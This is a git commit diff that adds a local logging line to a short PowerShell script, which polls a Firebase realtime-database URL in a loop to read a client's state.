1a54bd394aac106b6a9ea0f98e5fe09e636f984a
currone <94299594+snackmasta@users.noreply.github.com>
2024-01-29 00:23:20 +0700

    fail safe plan

--- GetState.ps1
+++ GetState.ps1
@@ -1,5 +1,6 @@
 $client = "client_1"
 $url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/$client/state.json"
+echo "executing GetState.ps1" > C:\temp\beacon\log2.txt
 
 while ($true) {
     $response = Invoke-RestMethod -Uri $url
